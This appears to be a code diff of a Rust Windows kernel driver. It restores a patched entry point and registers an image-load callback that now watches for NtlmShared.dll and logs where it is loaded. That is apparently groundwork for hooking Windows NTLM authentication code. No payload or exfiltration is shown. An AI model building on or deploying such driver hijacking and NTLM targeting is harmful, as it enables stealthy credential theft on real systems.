@@ -17,10 +17,16 @@ use log::LevelFilter;
 use winapi::{
     ctypes::c_void,
     km::wdm::{DRIVER_OBJECT, KPROCESSOR_MODE},
-    shared::{ntdef::{HANDLE, NTSTATUS}, ntstatus::STATUS_SUCCESS},
+    shared::{
+        ntdef::{HANDLE, NTSTATUS},
+        ntstatus::STATUS_SUCCESS,
+    },
 };
 
-use crate::include::{ntddk::{IoFreeMdl, MmUnlockPages, PsSetLoadImageNotifyRoutine}, types::LOAD_IMAGE_NOTIFY_ROUTINE};
+use crate::include::{
+    ntddk::{IoFreeMdl, MmUnlockPages, PsSetLoadImageNotifyRoutine},
+    types::LOAD_IMAGE_NOTIFY_ROUTINE,
+};
 
 const JMP_SIZE: usize = 14;
 const LEA_SIZE: usize = 7;
@@ -73,7 +79,9 @@ pub unsafe extern "system" fn driver_entry(
     log::info!("[*] Restoring original entry point");
     copy_data(&RESTORE_DATA, target_entry);
     log::info!("[*] Registering callback for loaded images");
-    if PsSetLoadImageNotifyRoutine(load_image_callback as LOAD_IMAGE_NOTIFY_ROUTINE) == STATUS_SUCCESS {
+    if PsSetLoadImageNotifyRoutine(load_image_callback as LOAD_IMAGE_NOTIFY_ROUTINE)
+        == STATUS_SUCCESS
+    {
         log::info!("[+] Callback registered successfully!");
     }
 
@@ -113,12 +121,17 @@ unsafe fn copy_data(src: &[u8], dst: *mut c_void) {
 
 pub unsafe extern "C" fn load_image_callback(
     full_image_name: *const UNICODE_STRING,
-    process_id: HANDLE,
-    _image_info: *mut IMAGE_INFO,
+    _process_id: HANDLE,
+    image_info: *mut IMAGE_INFO,
 ) {
-    log::info!(
-        "[D] Module '{}' loaded for process {:?}",
-        (*full_image_name).as_str().unwrap(),
-        process_id
-    );
+    if (*full_image_name)
+        .as_str()
+        .expect("Failed to read UTF-16 string")
+        .ends_with("NtlmShared.dll")
+    {
+        log::info!(
+            "[+] Found NtlmShared.dll at address {:?}",
+            (*image_info).ImageBase
+        );
+    }
 }
